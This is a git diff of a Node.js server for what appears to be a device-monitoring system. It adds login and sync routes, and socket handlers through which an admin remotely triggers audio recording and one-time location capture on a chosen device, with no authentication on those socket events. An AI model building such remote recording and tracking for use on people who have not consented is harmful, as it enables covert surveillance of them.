@@ -7,6 +7,9 @@ require('dotenv').config();
 const { connectDB } = require('./src/config/database');
 const uploadRoutes = require('./src/routes/upload.routes');
 const historyRoutes = require('./src/routes/history.routes');
+const authRoutes = require('./src/routes/auth.routes');
+const syncRoutes = require('./src/routes/sync.routes');
+const authMiddleware = require('./src/middlewares/auth.middleware');
 
 const path = require('path');
 
@@ -33,14 +36,21 @@ app.use((req, res, next) => {
   next();
 });
 
+app.use('/api/auth', authRoutes); // Auth routes (login/seed)
+app.use('/api/sync', syncRoutes); // Public sync route (device sends id)
 app.use('/upload', uploadRoutes); // Register upload routes
-app.use('/api/history', historyRoutes); // Register history routes
+app.use('/api/history', authMiddleware, historyRoutes); // Protect history routes with JWT
 app.use('/uploads', express.static('uploads')); // Serve uploaded files statically
+app.use(express.static(path.join(__dirname, 'public'))); // Serve assets (CSS/JS)
 
 // Admin Dashboard Route
-app.use(express.static(path.join(__dirname, 'public')));
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Login Page Route
+app.get('/login', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 // Add a simple route to verify connectivity
@@ -102,6 +112,16 @@ io.on('connection', (socket) => {
   socket.on('toggle_tracking', (data) => {
     console.log(`📡 Admin requested to ${data.action} tracking for device:`, data.deviceId);
     io.to(data.deviceId).emit('remote_control', { action: data.action });
+  });
+
+  socket.on('trigger_audio', (data) => {
+    console.log(`🎙️ Admin requested audio recording for device:`, data.deviceId, `Duration: ${data.duration}s`);
+    io.to(data.deviceId).emit('trigger_audio', { duration: data.duration || 30 });
+  });
+
+  socket.on('request_current_location', (data) => {
+    console.log(`📍 Admin requested ONE-TIME location for device:`, data.deviceId);
+    io.to(data.deviceId).emit('get_location_once');
   });
 
   // Dashboard requests list of online devices
